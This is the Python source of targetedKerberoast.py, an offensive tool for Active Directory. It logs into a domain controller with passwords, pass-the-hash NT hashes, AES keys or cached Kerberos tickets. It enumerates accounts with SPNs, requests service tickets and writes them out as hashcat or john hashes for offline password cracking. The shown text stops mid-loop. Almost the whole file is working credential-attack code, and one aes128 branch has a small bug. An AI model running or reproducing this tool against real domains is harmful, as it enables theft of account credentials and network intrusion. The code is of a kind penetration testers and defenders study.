#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : targetedKerberoast.py
# Author             : Shutdown (@_nwodtuhs)
# Date created       : 2 Aug 2021

import argparse, sys
import os
import ssl
import traceback
from binascii import hexlify, unhexlify

import ldap3
from pyasn1.codec.der import decoder
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from impacket.smbconnection import SMBConnection

from rich.console import Console


def get_machine_name(dc_ip, domain):
    if dc_ip is not None:
        s = SMBConnection(dc_ip, dc_ip)
    else:
        s = SMBConnection(domain, domain)
    try:
        s.login('', '')
    except Exception:
        if s.getServerName() == '':
            raise Exception('Error while anonymous logging into %s' % domain)
    else:
        s.logoff()
    return s.getServerName()


def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='', nthash='', aes_key='', kdcHost=None,
                         TGT=None, TGS=None, useCache=True):
    from pyasn1.codec.ber import encoder, decoder
    from pyasn1.type.univ import noValue
    """
    logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
    :param string user: username
    :param string password: password for the user
    :param string domain: domain where the account is valid for (required)
    :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
    :param string nthash: NTHASH used to authenticate using hashes (password is not used)
    :param string aes_key: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
    :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
    :param struct TGT: If there's a TGT available, send the structure here and it will be used
    :param struct TGS: same for TGS. See smb3.py for the format
    :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
    :return: True, raises an Exception if error.
    """

    if lmhash != '' or nthash != '':
        if len(lmhash) % 2:
            lmhash = '0' + lmhash
        if len(nthash) % 2:
            nthash = '0' + nthash
        try:  # just in case they were converted already
            lmhash = unhexlify(lmhash)
            nthash = unhexlify(nthash)
        except TypeError:
            pass

    if user is None:
        user = ""

    # Importing down here so pyasn1 is not required if kerberos is not used.
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime, Ticket
    import datetime

    if TGT is not None or TGS is not None or aes_key is not None:
        useCache = False

    if useCache:
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except Exception as e:
            pass
        else:
            # retrieve domain information from CCache file if needed
            if domain == '':
                domain = ccache.principal.realm['data'].decode('utf-8')
                logger.debug('Domain retrieved from CCache: %s' % domain)

            logger.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
            principal = 'ldap/%s@%s' % (target.upper(), domain.upper())

            creds = ccache.getCredential(principal)
            if creds is None:
                # Let's try for the TGT and go from there
                principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
                creds = ccache.getCredential(principal)
                if creds is not None:
                    TGT = creds.toTGT()
                    logger.debug('Using TGT from cache')
                else:
                    logger.debug('No valid credentials found in cache')
            else:
                TGS = creds.toTGS(principal)
                logger.debug('Using TGS from cache')

            # retrieve user information from CCache file if needed
            if user == '' and creds is not None:
                user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                logger.debug('Username retrieved from CCache: %s' % user)
            elif user == '' and len(ccache.principal.components) > 0:
                user = ccache.principal.components[0]['data'].decode('utf-8')
                logger.debug('Username retrieved from CCache: %s' % user)

    # First of all, we need to get a TGT for the user
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
                                                                    aes_key, kdcHost)
    else:
        tgt = TGT['KDC_REP']
        cipher = TGT['cipher']
        sessionKey = TGT['sessionKey']

    if TGS is None:
        serverName = Principal('ldap/%s' % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
                                                                sessionKey)
    else:
        tgs = TGS['KDC_REP']
        cipher = TGS['cipher']
        sessionKey = TGS['sessionKey']

        # Let's build a NegTokenInit with a Kerberos REQ_AP

    blob = SPNEGO_NegTokenInit()

    # Kerberos
    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    # Let's extract the ticket from the TGS
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    # Now let's build the AP_REQ
    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = []
    apReq['ap-options'] = constants.encodeFlags(opts)
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', userName.components_to_asn1)
    now = datetime.datetime.now(datetime.timezone.utc)

    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 11
    # AP-REQ Authenticator (includes application authenticator
    # subkey), encrypted with the application session key
    # (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

    blob['MechToken'] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
                                                  blob.getData())

    # Done with the Kerberos saga, now let's get into LDAP
    if connection.closed:  # try to open connection if closed
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
    connection.sasl_in_progress = False
    if response[0]['result'] != 0:
        raise Exception(response)

    connection.bound = True

    return True




def init_ldap_connection(target, tls_version, use_kerberos, domain, username, password, lmhash="", nthash=""):
    user = '%s\\%s' % (domain, username)
    connect_to = target
    if args.dc_ip is not None:
        connect_to = args.dc_ip
    if tls_version is not None:
        use_ssl = True
        port = 636
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
    else:
        use_ssl = False
        port = 389
        tls = None
    ldap_server = ldap3.Server(connect_to, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
    if use_kerberos:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, args.auth_aes_key, kdcHost=args.dc_ip)
    elif lmhash != "" and nthash != "":
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session


def init_ldap_session(use_kerberos, use_ldaps, dc_ip, domain, username, password, lmhash, nthash):
    if use_kerberos and not args.dc_host:
        target = get_machine_name(dc_ip, domain)
    else:
        if use_kerberos:
            target = args.dc_host
        else:
            if dc_ip is not None:
                target = args.dc_ip
            else:
                target = domain

    if use_ldaps is True:
        try:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1_2, use_kerberos, domain, username, password, lmhash, nthash)
        except ldap3.core.exceptions.LDAPSocketOpenError:
            return init_ldap_connection(target, ssl.PROTOCOL_TLSv1, use_kerberos, domain, username, password, lmhash, nthash)
    else:
        return init_ldap_connection(target, None, use_kerberos, domain, username, password, lmhash, nthash)


def get_users_and_SPNs(ldap_session, domain, usernames=None):
    if domain is None or "." not in domain:
        logger.error("FQDN Domain is needed to fetch domain information from LDAP")
        exit(0)
    else:
        domain_dn = ",".join(["DC=" + part for part in domain.split(".")])

    # Building the search filter
    filter_person = "objectCategory=person"
    filter_not_disabled = "!(userAccountControl:1.2.840.113556.1.4.803:=2)"

    search_filters = "(&"
    search_filters += "(" + filter_person + ")"
    search_filters += "(" + filter_not_disabled + ")"
    if usernames is not None:
        search_filters += '(|' + ''.join(["(sAMAccountName:=%s)" % u for u in usernames]) + ')'
    search_filters += ')'

    # we want username and attempts left for each account
    attributes = ["samAccountName", "servicePrincipalName", "distinguishedName"]

    try:
        ldap_session.search(search_base=domain_dn, search_filter=search_filters, attributes=attributes, size_limit=100000)
    except Exception as e:
        if 'sizeLimitExceeded' in e:
            logger.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
            # We reached the sizeLimit, process the answers we have already and that's it. Until we implement paged queries
            pass
        else:
            raise

    users = {}
    for item in ldap_session.response:
        if "attributes" in item.keys():
            if "sAMAccountName" in item["attributes"].keys():
                sAMAccountName = item["attributes"]["sAMAccountName"]
                # following check is because tests have shown that with a Kerberos auth, results are sent in a list while str with NTLM auth (wtf?)
                if type(sAMAccountName) == list:
                    sAMAccountName = sAMAccountName[0]
                users[sAMAccountName] = {}
            if "distinguishedName" in item["attributes"].keys():
                distinguishedName = item["attributes"]["distinguishedName"]
                users[sAMAccountName]["dn"] = distinguishedName
            if "servicePrincipalName" in item["attributes"].keys():
                users[sAMAccountName]["spns"] = item["attributes"]["servicePrincipalName"]
    return users


def obtain_krb_hash(TGT, sAMAccountName, target_domain, kdc_host):
    downLevelLogonName = target_domain + "\\" + sAMAccountName
    try:
        principalName = Principal()
        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
        principalName.components = [downLevelLogonName]
        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, target_domain, kdc_host, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
        # self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.__targetDomain + "/" + sAMAccountName, fd)
        spn = '%s/%s' % (target_domain, sAMAccountName)
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        entry = None
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, sAMAccountName, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, sAMAccountName, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode)
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, sAMAccountName, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, sAMAccountName, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
        else:
            logger.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))
        return entry
    except Exception as e:
        if args.verbosity >= 1:
            traceback.print_exc()
        logger.debug("Exception: %s" % e)
        logger.error('Principal: %s - %s' % (downLevelLogonName, str(e)))

def handle_result(filename, result, user):
    if result is not None:
        # Prepend the username for better output with john
        if args.output_format == 'john':
            result = user + ':' + result
        if filename is not None and filename != '':
            if len(os.path.dirname(filename)) != 0:
                if not os.path.exists(os.path.dirname(filename)):
                    os.makedirs(os.path.dirname(filename), exist_ok=True)
            if not os.path.exists(filename):
                open(filename, "w").close()
            with open(filename, 'a') as f:
                logger.success("Writing hash to file for (%s)" % user)
                f.write(result.strip() + "\n")
        else:
            logger.success("Printing hash for (%s)" % user)
            print(result)


class Logger(object):
    def __init__(self, verbosity=0, quiet=False):
        self.verbosity = verbosity
        self.quiet = quiet
        if verbosity == 3:
            print("(╯°□°）╯︵ ┻━┻ WHAT HAVE YOU DONE !? (╯°□°）╯︵ ┻━┻")
            exit(0)
        elif verbosity == 4:
            art = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⡉⣉⡛⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠄⠄⢀⣸⣿⣿⡿⠿⡯⢙⠿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡿⠄⠄⠄⠄⠄⡀⡀⠄⢀⣀⣉⣉⣉⠁⠐⣶⣶⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠁⣿⣿⣀⠈⠿⢟⡛⠛⣿⠛⠛⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠈⠁⠰⣄⣴⡬⢵⣴⣿⣤⣽⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡇⠄⢀⢄⡀⠄⠄⠄⠄⡉⠻⣿⡿⠁⠘⠛⡿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⡿⠃⠄⠄⠈⠻⠄⠄⠄⠄⢘⣧⣀⠾⠿⠶⠦⢳⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣶⣤⡀⢀⡀⠄⠄⠄⠄⠄⠄⠻⢣⣶⡒⠶⢤⢾⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡿⠟⠋⠄⢘⣿⣦⡀⠄⠄⠄⠄⠄⠉⠛⠻⠻⠺⣼⣿⠟⠋⠛⠿⣿⣿
    ⠋⠉⠁⠄⠄⠄⠄⠄⠄⢻⣿⣿⣶⣄⡀⠄⠄⠄⠄⢀⣤⣾⣿⣿⡀⠄⠄⠄⠄⢹
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣷⡤⠄⠰⡆⠄⠄⠈⠉⠛⠿⢦⣀⡀⡀⠄
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⠟⡋⠄⠄⠄⢣⠄⠄⠄⠄⠄⠄⠄⠈⠹⣿⣀
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣷⣿⣿⣷⠄⠄⢺⣇⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⡇⠄⠄⠸⣿⡄⠄⠈⠁⠄⠄⠄⠄⠄⣿
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⡇⠄⠄⠄⢹⣧⠄⠄⠄⠄⠄⠄⠄⠄⠘⠀⠀⠀⠀⠀⠀

⠀The best tools in the history of tools. Ever.
"""
            print(art)
            exit(0)
        elif verbosity == 5:
            art = """

    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
    ⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
    ⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
    ⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
    ⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
    ⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
    ⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁

⠀ 🈵⠀STOP INCREASING VERBOSITY (PUNK!) 🈵⠀
"""
            print(art)
            exit(0)

        elif verbosity == 6:
            art = """
    ⣿⣿⣿⣿⣿⣿⠟⠋⠁⣀⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿
    ⣿⣿⣿⣿⠋⠁⠀⠀⠺⠿⢿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣿
    ⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⠀⠀⠀⠀⠀⣤⣦⣄⠀⠀
    ⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⠏⣿⣿⣿⣿⣿⣁⠀⠀⠀⠛⠙⠛⠋⠀⠀
    ⡿⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⣰⣿⣿⣿⣿⡄⠘⣿⣿⣿⣿⣷⠄⠀⠀⠀⠀⠀⠀⠀⠀
    ⡇⠀⠀⠀⠀⠀⠀⠀⠸⠇⣼⣿⣿⣿⣿⣿⣷⣄⠘⢿⣿⣿⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀
    ⠁⠀⠀⠀⣴⣿⠀⣐⣣⣸⣿⣿⣿⣿⣿⠟⠛⠛⠀⠌⠻⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣶⣮⣽⣰⣿⡿⢿⣿⣿⣿⣿⣿⡀⢿⣤⠄⢠⣄⢹⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⣿⣿⣿⣿⣿⡘⣿⣿⣿⣿⣿⣿⠿⣶⣶⣾⣿⣿⡆⢻⣿⣿⠃⢠⠖⠛⣛⣷⠀
    ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣮⣝⡻⠿⠿⢃⣄⣭⡟⢀⡎⣰⡶⣪⣿⠀
    ⠀⠀⠘⣿⣿⣿⠟⣛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⡿⢁⣾⣿⢿⣿⣿⠏⠀
    ⠀⠀⠀⣻⣿⡟⠘⠿⠿⠎⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⣿⣿⠧⣷⠟⠁⠀⠀
    ⡇⠀⠀⢹⣿⡧⠀⡀⠀⣀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⢰⣿⠀⠀⠀⠀
    ⡇⠀⠀⠀⢻⢰⣿⣶⣿⡿⠿⢂⣿⣿⣿⣿⣿⣿⣿⢿⣻⣿⣿⣿⡏⠀⠀⠁⠀⠀⠀⠀
    ⣷⠀⠀⠀⠀⠈⠿⠟⣁⣴⣾⣿⣿⠿⠿⣛⣋⣥⣶⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀

    yamete kudasai !!!
"""
            print(art)
            exit(0)
        elif verbosity > 6:
            print("Sorry bruh, no more easter eggs")
            exit(0)

    def debug(self, message):
        if self.verbosity == 2:
            console.print("{}[DEBUG]{} {}".format("[yellow3]", "[/yellow3]", message), highlight=False)

    def verbose(self, message):
        if self.verbosity >= 1:
            console.print("{}[VERBOSE]{} {}".format("[blue]", "[/blue]", message), highlight=False)

    def info(self, message):
        if not self.quiet:
            console.print("{}[*]{} {}".format("[bold blue]", "[/bold blue]", message), highlight=False)

    def success(self, message):
        if not self.quiet:
            console.print("{}[+]{} {}".format("[bold green]", "[/bold green]", message), highlight=False)

    def warning(self, message):
        if not self.quiet:
            console.print("{}[-]{} {}".format("[bold orange3]", "[/bold orange3]", message), highlight=False)

    def error(self, message):
        if not self.quiet:
            console.print("{}[!]{} {}".format("[bold red]", "[/bold red]", message), highlight=False)


def parse_args():
    parser = argparse.ArgumentParser(description = "Queries target domain for SPNs that are running under a user account and operate targeted Kerberoasting")
    parser.add_argument("-v", "--verbose", dest="verbosity", action="count", default=0, help="verbosity level (-v for verbose, -vv for debug)")
    parser.add_argument("-q", "--quiet", dest="quiet", action="store_true", default=False, help="show no information at all")
    parser.add_argument('-D', '--target-domain', action='store', help='Domain to query/request if different than the domain of the user. Allows for Kerberoasting across trusts.')
    parser.add_argument('-U', '--users-file', help='File with user per line to test')
    parser.add_argument('--request-user', action='store', metavar='username', help='Requests TGS for the SPN associated to the user specified (just the username, no domain needed)')
    parser.add_argument('-o', '--output-file', action='store', help='Output filename to write ciphers in JtR/hashcat format')
    parser.add_argument('-f', '--output-format', action='store', choices=['hashcat', 'john'], default='hashcat', help='Output format (default is "hashcat", "john" prepends usernames)')
    parser.add_argument('--use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
    parser.add_argument('--only-abuse', action='store_true', help='Ignore accounts that already have an SPN and focus on targeted Kerberoasting')
    parser.add_argument('--no-abuse', action='store_true', help="Don't attempt targeted Kerberoasting")
    parser.add_argument('--dc-host', action='store', help='Hostname of the target, can be used if port 445 is blocked or if NTLM is disabled')


    authconn = parser.add_argument_group('authentication & connection')
    authconn.add_argument('--dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')
    authconn.add_argument("-d", "--domain", dest="auth_domain", metavar="DOMAIN", action="store", help="(FQDN) domain to authenticate to")
    authconn.add_argument("-u", "--user", dest="auth_username", metavar="USER", action="store", help="user to authenticate with")

    secret = parser.add_argument_group('secrets')
    secret.add_argument("-k", "--kerberos", dest="use_kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
    cred = secret.add_mutually_exclusive_group()
    cred.add_argument('--no-pass', action="store_true", help="don't ask for password (useful for -k)")
    cred.add_argument("-p", "--password", dest="auth_password", metavar="PASSWORD", action="store", help="password to authenticate with")
    cred.add_argument("-H", "--hashes", dest="auth_hashes", action="store", metavar="[LMHASH:]NTHASH", help='NT/LM hashes, format is LMhash:NThash')
    cred.add_argument('--aes-key', dest="auth_aes_key", action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')

    args = parser.parse_args()

    if args.no_abuse and args.only_abuse:
        parser.error("can't set --no-abuse and --only-abuse, it's counterintuitive")

    if args.use_kerberos == False and args.auth_aes_key is None and args.auth_hashes is None and args.auth_password is None and args.auth_username is None:
        parser.error("need to set credentials")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return args

def main():
    try:
        logger.info("Starting kerberoast attacks")
        auth_lm_hash = ""
        auth_nt_hash = ""
        if args.auth_hashes is not None:
            if ":" in args.auth_hashes:
                auth_lm_hash = args.auth_hashes.split(":")[0]
                auth_nt_hash = args.auth_hashes.split(":")[1]
            else:
                auth_nt_hash = args.auth_hashes
            if auth_nt_hash == "":
                auth_nt_hash = "31d6cfe0d16ae931b73c59d7e0c089c0"
            if auth_lm_hash == "":
                auth_lm_hash = "aad3b435b51404eeaad3b435b51404ee"
        
        use_kerb = args.use_kerberos
        if args.auth_aes_key is not None:
            use_kerb = True

        ldap_server, ldap_session = init_ldap_session(dc_ip=args.dc_ip, use_kerberos=use_kerb, use_ldaps=args.use_ldaps, domain=args.auth_domain, username=args.auth_username, password=args.auth_password, lmhash=auth_lm_hash, nthash=auth_nt_hash)
        users = {}
        if args.request_user is not None:
            logger.info("Attacking user (%s)" % args.request_user)
            users = get_users_and_SPNs(ldap_session=ldap_session, domain=args.auth_domain, usernames=[args.request_user])
        elif args.users_file is not None:
            logger.info("Fetching usernames from file")
            if os.path.exists(args.users_file):
                with open(args.users_file, "r") as f:
                    users = get_users_and_SPNs(ldap_session=ldap_session, domain=args.auth_domain, usernames= [line.strip() for line in f])
        else:
            logger.info("Fetching usernames from Active Directory with LDAP")
            users = get_users_and_SPNs(ldap_session=ldap_session, domain=args.auth_domain)

        logger.debug(users)

        # First of all, we need to get a TGT for the user
        userName = Principal(args.auth_username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        if args.use_kerberos and not args.dc_host:
            target = get_machine_name(args.dc_ip, args.auth_domain)
        else:
            if args.use_kerberos:
                target = args.dc_host
            else:
                if args.dc_ip is not None:
                    target = args.dc_ip
                else:
                    target = args.auth_domain

        TGT = TGS = None
        if args.use_kerberos and args.auth_aes_key is None:
            try:
                ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
            except Exception as e:
                pass
            else:
                # retrieve domain information from CCache file if needed
                if args.auth_domain == '':
                    domain = ccache.principal.realm['data'].decode('utf-8')
                    logger.debug('Domain retrieved from CCache: %s' % domain)
                else:
                    domain = args.auth_domain

                logger.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
                principal = 'ldap/%s@%s' % (target.upper(), domain.upper())

                creds = ccache.getCredential(principal)
                if creds is None:
                    # Let's try for the TGT and go from there
                    principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
                    creds = ccache.getCredential(principal)
                    if creds is not None:
                        TGT = creds.toTGT()
                        logger.debug('Using TGT from cache')
                    else:
                        logger.debug('No valid credentials found in cache')
                else:
                    TGS = creds.toTGS(principal)
                    logger.debug('Using TGS from cache')

                # retrieve user information from CCache file if needed
                if args.auth_username == '' and creds is not None:
                    user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                    logger.debug('Username retrieved from CCache: %s' % user)
                elif args.auth_username == '' and len(ccache.principal.components) > 0:
                    user = ccache.principal.components[0]['data'].decode('utf-8')
                    logger.debug('Username retrieved from CCache: %s' % user)

        if TGT is None:
            if TGS is None:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,
                                                                        aesKey=args.auth_aes_key, kdcHost=args.dc_ip)
        else:
            tgt = TGT['KDC_REP']
            cipher = TGT['cipher']
            sessionKey = TGT['sessionKey']

        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        for user in users:
            # if user already as one or more SPNs
            if len(users[user]['spns']) != 0 and not args.only_abuse:
                logger.debug("User (%s) has an SPN, kerberoasting now" % user)
                krb5tgs = obtain_krb_hash(TGT=TGT, sAMAccountName=user, target_domain=(args.auth_domain if args.target_domain is None else args.target_domain), kdc_host=args.dc_ip)
                handle_result(filename=args.output_file, result=krb5tgs, user=user)
